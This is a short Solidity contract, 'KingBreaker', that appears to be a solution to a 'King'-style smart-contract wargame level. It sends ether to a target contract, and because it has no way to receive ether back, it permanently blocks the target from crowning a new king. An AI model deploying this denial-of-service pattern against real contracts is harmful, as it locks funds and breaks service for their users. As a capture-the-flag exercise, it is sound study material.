// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract KingBreaker {
    constructor() payable {
    }

    function claimKingship(address payable _to) public payable {
        (bool sent, ) = _to.call{value: msg.value}("");
        require(sent);
    }
}